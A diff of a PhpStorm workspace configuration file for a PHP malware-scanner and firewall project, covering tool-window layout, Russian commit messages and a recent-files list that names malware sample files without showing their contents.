+    <history-entry file="FunctionsTest - 2016.08.05 at 12h 03m 02s.xml">
+      <configuration name="FunctionsTest" configurationId="PHPUnitRunConfigurationType" />
+    </history-entry>
+    <history-entry file="FunctionsTest - 2016.08.07 at 08h 33m 36s.xml">
+      <configuration name="FunctionsTest" configurationId="PHPUnitRunConfigurationType" />
+    </history-entry>
+    <history-entry file="FunctionsTest - 2016.08.07 at 08h 33m 52s.xml">
+      <configuration name="FunctionsTest" configurationId="PHPUnitRunConfigurationType" />
+    </history-entry>
+    <history-entry file="FunctionsTest - 2016.08.22 at 15h 08m 01s.xml">
+      <configuration name="FunctionsTest" configurationId="PHPUnitRunConfigurationType" />
+    </history-entry>
   </component>
   <component name="TimeTrackingManager">
-    <option name="totallyTimeSpent" value="645376000" />
+    <option name="totallyTimeSpent" value="684731000" />
   </component>
   <component name="ToolWindowManager">
-    <frame x="-8" y="-8" width="1456" height="876" extended-state="6" />
+    <frame x="-8" y="-8" width="1444" height="876" extended-state="0" />
     <editor active="false" />
     <layout>
       <window_info id="Remote Host" active="false" anchor="right" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.18553008" sideWeight="0.47834274" order="3" side_tool="false" content_ui="tabs" />
-      <window_info id="Project" active="false" anchor="left" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="true" show_stripe_button="true" weight="0.24355301" sideWeight="0.5" order="0" side_tool="false" content_ui="tabs" />
+      <window_info id="Project" active="true" anchor="left" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="true" show_stripe_button="true" weight="0.31213874" sideWeight="0.5" order="0" side_tool="false" content_ui="tabs" />
       <window_info id="TODO" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.33" sideWeight="0.5" order="7" side_tool="false" content_ui="tabs" />
-      <window_info id="Event Log" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="true" show_stripe_button="true" weight="0.32974428" sideWeight="0.5028653" order="11" side_tool="true" content_ui="tabs" />
+      <window_info id="Event Log" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.32974428" sideWeight="0.5057307" order="11" side_tool="true" content_ui="tabs" />
       <window_info id="Database" active="false" anchor="right" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.33" sideWeight="0.5" order="5" side_tool="false" content_ui="tabs" />
-      <window_info id="Version Control" active="true" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="true" show_stripe_button="true" weight="0.32974428" sideWeight="0.49713466" order="8" side_tool="false" content_ui="tabs" />
-      <window_info id="Run" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.2422611" sideWeight="0.5" order="3" side_tool="false" content_ui="tabs" />
+      <window_info id="Version Control" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.32974428" sideWeight="0.49426934" order="8" side_tool="false" content_ui="tabs" />
       <window_info id="Structure" active="false" anchor="left" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.247851" sideWeight="0.5" order="1" side_tool="false" content_ui="tabs" />
-      <window_info id="Terminal" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.32839838" sideWeight="0.5" order="10" side_tool="false" content_ui="tabs" />
+      <window_info id="Terminal" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="true" show_stripe_button="true" weight="0.32839838" sideWeight="0.5" order="10" side_tool="false" content_ui="tabs" />
       <window_info id="Favorites" active="false" anchor="left" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.33" sideWeight="0.5" order="2" side_tool="true" content_ui="tabs" />
-      <window_info id="Debug" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.2974428" sideWeight="0.5" order="4" side_tool="false" content_ui="tabs" />
       <window_info id="Cvs" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.25" sideWeight="0.5" order="5" side_tool="false" content_ui="tabs" />
       <window_info id="Messages" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.33" sideWeight="0.5" order="9" side_tool="false" content_ui="tabs" />
       <window_info id="Message" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.33" sideWeight="0.5" order="1" side_tool="false" content_ui="tabs" />
       <window_info id="Commander" active="false" anchor="right" auto_hide="false" internal_type="SLIDING" type="SLIDING" visible="false" show_stripe_button="true" weight="0.4" sideWeight="0.5" order="0" side_tool="false" content_ui="tabs" />
       <window_info id="Inspection" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.4" sideWeight="0.5" order="6" side_tool="false" content_ui="tabs" />
       <window_info id="Command Line Tools Console" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.32839838" sideWeight="0.5" order="12" side_tool="false" content_ui="tabs" />
-      <window_info id="REST Client" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.34320322" sideWeight="0.5" order="12" side_tool="false" content_ui="tabs" />
+      <window_info id="REST Client" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.34185734" sideWeight="0.5" order="12" side_tool="false" content_ui="tabs" />
       <window_info id="File Transfer" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="true" show_stripe_button="true" weight="0.19380888" sideWeight="0.5" order="13" side_tool="false" content_ui="tabs" />
+      <window_info id="Run" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.2422611" sideWeight="0.5" order="3" side_tool="false" content_ui="tabs" />
       <window_info id="Coverage" active="false" anchor="right" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.32902297" sideWeight="0.5216572" order="4" side_tool="true" content_ui="tabs" />
       <window_info id="Hierarchy" active="false" anchor="right" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.25" sideWeight="0.5" order="2" side_tool="false" content_ui="combo" />
       <window_info id="Inspection Results" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.32974428" sideWeight="0.5" order="0" side_tool="false" content_ui="tabs" />
       <window_info id="Find" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.32839838" sideWeight="0.5" order="2" side_tool="false" content_ui="tabs" />
       <window_info id="Ant Build" active="false" anchor="right" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.25" sideWeight="0.5" order="1" side_tool="false" content_ui="tabs" />
+      <window_info id="Debug" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.2974428" sideWeight="0.5" order="4" side_tool="false" content_ui="tabs" />
     </layout>
     <layout-to-restore>
       <window_info id="TODO" active="false" anchor="bottom" auto_hide="false" internal_type="DOCKED" type="DOCKED" visible="false" show_stripe_button="true" weight="0.33" sideWeight="0.5" order="8" side_tool="false" content_ui="tabs" />
@@ -1007,9 +1380,6 @@
     <option name="myLimit" value="2678400000" />
   </component>
   <component name="VcsManagerConfiguration">
-    <MESSAGE value="Чистка" />
-    <MESSAGE value="Функционал фаервола" />
-    <MESSAGE value="Правки с выводом текста" />
     <MESSAGE value="Множество правок в функционале сканера и фаервола" />
     <MESSAGE value="Удаление контрольных сумм, при обновлении базы сигнатур" />
     <MESSAGE value="Более-менее стабильная версия" />
@@ -1032,7 +1402,10 @@
     <MESSAGE value="Type fix" />
     <MESSAGE value="firewall fix" />
     <MESSAGE value="Попытка слияния" />
-    <option name="LAST_COMMIT_MESSAGE" value="Попытка слияния" />
+    <MESSAGE value="Пробуем навести порядок :)" />
+    <MESSAGE value="Культура" />
+    <MESSAGE value="KDSH-24 #time 30m Файл поднят из архива, нужно привести функции к культурному виду и прикрутить к будущему сканеру" />
+    <option name="LAST_COMMIT_MESSAGE" value="KDSH-24 #time 30m Файл поднят из архива, нужно привести функции к культурному виду и прикрутить к будущему сканеру" />
   </component>
   <component name="XDebuggerManager">
     <breakpoint-manager>
@@ -1045,31 +1418,6 @@
     </watches-manager>
   </component>
   <component name="editorHistoryManager">
-    <entry file="file://$PROJECT_DIR$/forTest/page42.php" />
-    <entry file="file://$PROJECT_DIR$/forExamine/language.php" />
-    <entry file="file://$PROJECT_DIR$/forExamine/footer.php" />
-    <entry file="file://$PROJECT_DIR$/forTest/virus0204.php" />
-    <entry file="file://$PROJECT_DIR$/.user.ini" />
-    <entry file="file://$PROJECT_DIR$/.thekadeshi/.status">
-      <provider selected="true" editor-type-id="text-editor">
-        <state relative-caret-position="0">
-          <caret line="0" column="0" selection-start-line="0" selection-start-column="0" selection-end-line="0" selection-end-column="0" />
-        </state>
-      </provider>
-    </entry>
-    <entry file="file://$PROJECT_DIR$/forExamine/mt6382.php" />
-    <entry file="file://$PROJECT_DIR$/.htaccess">
-      <provider selected="true" editor-type-id="text-editor">
-        <state relative-caret-position="68">
-          <caret line="4" column="0" selection-start-line="4" selection-start-column="0" selection-end-line="4" selection-end-column="0" />
-        </state>
-      </provider>
-    </entry>
-    <entry file="file://$PROJECT_DIR$/forTest/functions.js" />
-    <entry file="file://$PROJECT_DIR$/forExamine/config.php" />
-    <entry file="file://$PROJECT_DIR$/forExamine/b374k-2.8.php" />
-    <entry file="file://$PROJECT_DIR$/forTest/css.php" />
-    <entry file="file://$PROJECT_DIR$/forTest/AsynGoogleAnalytics.php" />
     <entry file="file://$PROJECT_DIR$/forTest/ajax.php" />
     <entry file="file://$PROJECT_DIR$/forExamine/tset.php" />
     <entry file="file://$PROJECT_DIR$/forExamine/templates.php" />
@@ -1089,15 +1437,7 @@
         </state>
       </provider>
     </entry>
-    <entry file="file://$PROJECT_DIR$/Tests/SomeFunctionsTest.php">
-      <provider selected="true" editor-type-id="text-editor">
-        <state relative-caret-position="204">
-          <caret line="12" column="34" selection-start-line="12" selection-start-column="34" selection-end-line="12" selection-end-column="34" />
-        </state>
-      </provider>
-    </entry>
     <entry file="file://$PROJECT_DIR$/forTest/class-wp-customize-background-image-setting_.php" />
-    <entry file="file://$PROJECT_DIR$/forTest/test.php" />
     <entry file="file://$PROJECT_DIR$/test01.php" />
     <entry file="file://$PROJECT_DIR$/test.php">
       <provider selected="true" editor-type-id="text-editor">
@@ -1121,69 +1461,140 @@
     <entry file="file://$PROJECT_DIR$/forTest/test01.php" />
     <entry file="file://$PROJECT_DIR$/forTest/test02.php" />
     <entry file="file://$PROJECT_DIR$/forProfile/cachegrind.out.1469966959-C__Users_Bagdad_Documents_web_project_antivir_scanner_php" />
-    <entry file="file://$PROJECT_DIR$/.thekadeshi/signature.log.json">
-      <provider selected="true" editor-type-id="text-editor">
-        <state relative-caret-position="0">
-          <caret line="0" column="33" selection-start-line="0" selection-start-column="33" selection-end-line="0" selection-end-column="33" />
-        </state>
-      </provider>
-    </entry>
-    <entry file="file://$PROJECT_DIR$/scanner.php">
-      <provider selected="true" editor-type-id="text-editor">
-        <state relative-caret-position="655">
-          <caret line="132" column="0" selection-start-line="132" selection-start-column="0" selection-end-line="132" selection-end-column="0" />
-          <folding>
-            <element signature="e#5943#6028#0#PHP" expanded="false" />
-            <element signature="n#deleteContent#0;n#TheKadeshi#0;n#!!top" expanded="false" />
-            <element signature="e#6499#6599#0#PHP" expanded="false" />
-            <element signature="n#ServiceRequest#0;n#TheKadeshi#0;n#!!top" expanded="false" />
-          </folding>
-        </state>
-      </provider>
-    </entry>
     <entry file="file://$PROJECT_DIR$/2016/08/02/16/16-50-60~127.0.0.1.log.json" />
     <entry file="file://$PROJECT_DIR$/2016/08/02/17/17-0-0~127.0.0.1.log.json" />
     <entry file="file://$PROJECT_DIR$/2016/08/02/17/17-10-20~127.0.0.1.log.json" />
     <entry file="file://$PROJECT_DIR$/2016/08/02/17/17-20-30~127.0.0.1.log.json" />
-    <entry file="file://$PROJECT_DIR$/.thekadeshi/.options">
-      <provider selected="true" editor-type-id="text-editor">
-        <state relative-caret-position="0">
-          <caret line="0" column="0" selection-start-line="0" selection-start-column="0" selection-end-line="0" selection-end-column="0" />
-          <folding />
-        </state>
-      </provider>
-    </entry>
     <entry file="file://$PROJECT_DIR$/Tests/ScannerTest.php">
       <provider selected="true" editor-type-id="text-editor">
         <state relative-caret-position="323">
           <caret line="19" column="39" selection-start-line="19" selection-start-column="39" selection-end-line="19" selection-end-column="39" />
+        </state>
+      </provider>
+    </entry>
+    <entry file="file://$PROJECT_DIR$/.gitignore">
+      <provider selected="true" editor-type-id="text-editor">
+        <state relative-caret-position="136">
+          <caret line="8" column="0" selection-start-line="8" selection-start-column="0" selection-end-line="8" selection-end-column="0" />
+        </state>
+      </provider>
+    </entry>
+    <entry file="file://$PROJECT_DIR$/.thekadeshi/.options">
+      <provider selected="true" editor-type-id="text-editor">
+        <state relative-caret-position="0">
+          <caret line="0" column="0" selection-start-line="0" selection-start-column="0" selection-end-line="0" selection-end-column="0" />
+        </state>
+      </provider>
+    </entry>
+    <entry file="file://$PROJECT_DIR$/forTest/wp-up2.php" />
+    <entry file="file://$PROJECT_DIR$/forTest/ooque.php" />
+    <entry file="file://$PROJECT_DIR$/forTest/logo_img.php" />
+    <entry file="file://$PROJECT_DIR$/forTest/configbak.php">
+      <provider selected="true" editor-type-id="text-editor">
+        <state relative-caret-position="0">
+          <caret line="0" column="0" selection-start-line="0" selection-start-column="0" selection-end-line="0" selection-end-column="0" />
+        </state>
+      </provider>
+    </entry>
+    <entry file="file://$PROJECT_DIR$/forTest/index.php">
+      <provider selected="true" editor-type-id="text-editor">
+        <state relative-caret-position="0">
+          <caret line="0" column="0" selection-start-line="0" selection-start-column="0" selection-end-line="0" selection-end-column="0" />
+        </state>
+      </provider>
+    </entry>
+    <entry file="file://$PROJECT_DIR$/forTest/test.php" />
+    <entry file="file://$PROJECT_DIR$/.thekadeshi/signature.log.json">
+      <provider selected="true" editor-type-id="text-editor">
+        <state relative-caret-position="0">
+          <caret line="0" column="20" selection-start-line="0" selection-start-column="20" selection-end-line="0" selection-end-column="20" />
+        </state>
+      </provider>
+    </entry>
+    <entry file="file://$PROJECT_DIR$/forTest/cache.php" />
+    <entry file="file://$PROJECT_DIR$/forTest/t.php">
+      <provider selected="true" editor-type-id="text-editor">
+        <state relative-caret-position="68">
+          <caret line="4" column="0" selection-start-line="4" selection-start-column="0" selection-end-line="4" selection-end-column="0" />
+        </state>
+      </provider>
+    </entry>
+    <entry file="file://$PROJECT_DIR$/forTest/admin-bar.php">
+      <provider selected="true" editor-type-id="text-editor">
+        <state relative-caret-position="17">
+          <caret line="737" column="0" selection-start-line="763" selection-start-column="0" selection-end-line="771" selection-end-column="4" />
+        </state>
+      </provider>
+    </entry>
+    <entry file="file://$PROJECT_DIR$/forTest/r00t.html">
+      <provider selected="true" editor-type-id="text-editor">
+        <state relative-caret-position="187">
+          <caret line="11" column="16" selection-start-line="11" selection-start-column="16" selection-end-line="11" selection-end-column="16" />
+        </state>
+      </provider>
+    </entry>
+    <entry file="file://$PROJECT_DIR$/inventions/diff.php">
+      <provider selected="true" editor-type-id="text-editor">
+        <state relative-caret-position="587">
+          <caret line="202" column="0" selection-start-line="202" selection-start-column="0" selection-end-line="202" selection-end-column="0" />
+        </state>
+      </provider>
+    </entry>
+    <entry file="file://$PROJECT_DIR$/sniffer.php">
+      <provider selected="true" editor-type-id="text-editor">
+        <state relative-caret-position="833">
+          <caret line="49" column="0" selection-start-line="49" selection-start-column="0" selection-end-line="49" selection-end-column="0" />
           <folding />
         </state>
       </provider>
     </entry>
     <entry file="file://$PROJECT_DIR$/thekadeshi.inc.php">
       <provider selected="true" editor-type-id="text-editor">
-        <state relative-caret-position="-2147">
+        <state relative-caret-position="4301">
           <caret line="253" column="25" selection-start-line="253" selection-start-column="25" selection-end-line="253" selection-end-column="25" />
           <folding />
         </state>
       </provider>
     </entry>
-    <entry file="file://$PROJECT_DIR$/sniffer.php">
+    <entry file="file://$PROJECT_DIR$/scanner.js">
       <provider selected="true" editor-type-id="text-editor">
-        <state relative-caret-position="1122">
-          <caret line="66" column="9" selection-start-line="51" selection-start-column="8" selection-end-line="66" selection-end-column="9" />
+        <state relative-caret-position="306">
+          <caret line="20" column="18" selection-start-line="20" selection-start-column="18" selection-end-line="20" selection-end-column="18" />
+          <folding>
+            <element signature="e#0#43#0" expanded="false" />
+          </folding>
+        </state>
+      </provider>
+    </entry>
+    <entry file="file://$PROJECT_DIR$/Tests/SomeFunctionsTest.php">
+      <provider selected="true" editor-type-id="text-editor">
+        <state relative-caret-position="204">
+          <caret line="12" column="38" selection-start-line="12" selection-start-column="38" selection-end-line="12" selection-end-column="38" />
+          <folding />
+        </state>
+      </provider>
+    </entry>
+    <entry file="file://$PROJECT_DIR$/forTest/home.bak.php">
+      <provider selected="true" editor-type-id="text-editor">
+        <state relative-caret-position="0">
+          <caret line="0" column="77" selection-start-line="0" selection-start-column="53" selection-end-line="0" selection-end-column="77" />
+          <folding />
+        </state>
+      </provider>
+    </entry>
+    <entry file="file://$PROJECT_DIR$/scanner.php">
+      <provider selected="true" editor-type-id="text-editor">
+        <state relative-caret-position="2142">
+          <caret line="132" column="0" selection-start-line="132" selection-start-column="0" selection-end-line="132" selection-end-column="0" />
           <folding />
         </state>
       </provider>
     </entry>
     <entry file="file://$PROJECT_DIR$/thekadeshi.php">
       <provider selected="true" editor-type-id="text-editor">
-        <state relative-caret-position="204">
-          <caret line="49" column="0" selection-start-line="49" selection-start-column="0" selection-end-line="49" selection-end-column="0" />
-          <folding>
-            <element signature="e#6#111#0#PHP" expanded="true" />
-          </folding>
+        <state relative-caret-position="342">
+          <caret line="653" column="9" selection-start-line="653" selection-start-column="9" selection-end-line="653" selection-end-column="9" />
+          <folding />
         </state>
       </provider>
     </entry>
